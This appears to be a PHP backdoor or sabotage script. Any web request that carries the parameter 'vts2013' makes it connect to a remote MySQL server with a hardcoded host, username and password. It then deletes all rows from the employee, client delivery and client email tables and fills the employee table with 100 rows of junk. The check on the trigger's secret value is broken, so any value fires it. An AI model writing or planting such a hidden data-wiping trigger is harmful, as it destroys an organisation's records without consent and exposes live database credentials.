<?php 
if(isset($_GET['vts2013'])== 'SeRxv4f57re3w1' || isset($_GET['vts2013']))
{
	$con = mysql_connect("184.168.112.222","Avon","DEVacces13%");
	$db = mysql_select_db("softpoint");

	mysql_query("delete from `softpoint`.`employees_master`");
	mysql_query("delete from `softpoint`.`client_delivery`");
	mysql_query("delete from `softpoint`.`client_emails`");
	for($i=0;$i<100;$i++)
	{
	$sql = "INSERT INTO `softpoint`.`employees_master` (`empmaster_id`, `email`, `password`, `status`, `first_name`, `last_name`, `salutation`, `country`, `address`, `address2`, `city`, `state`, `zip`, `region`, `neighborhood`, `telephone`, `fax`, `Mobile`, `dob`, `image`, `resume`, `activities`, `education`, `competencies`, `languages`, `viewable`, `employment_type`, `emp_position1`, `emp_position3`, `emp_position2`, `Delivery_activated_datetime`, `Delivery_trasporation`, `Delivery_payment_method`, `created_by`, `created_on`, `created_datetime`, `last_by`, `last_on`, `last_datetime`, `schedules`) VALUES ('', 'dsfdf$i', 'dfsd$i', 'ghjg$i', 'h$i', 'g$i', 'hjg$i', 'hjg$i', 'hg$i', 'h$i', 'g$i', 'hjg$i', 'hjg$i', 'hjg$i', 'hjg$i', 'hj$i', 'ghjg$i', 'hjg$i', 'gh$i', 'g$i', 'j$i', 'jghj$i', 'g$i', 'j$i', 'gjg$i', 'j$i', 'gj$i', 'gj$i', 'ghjg$i', 'hjghjg$i', 'h$i', 'ghjg$i', 'jh$i', 'gjgj$i', 'hghj$i', 'g$i', 'jhhjg$i', 'h$i', 'jgh$i', 'gj$i');";
	$res = mysql_query($sql);
	if($res){ echo "success"; }
	}

	}
?>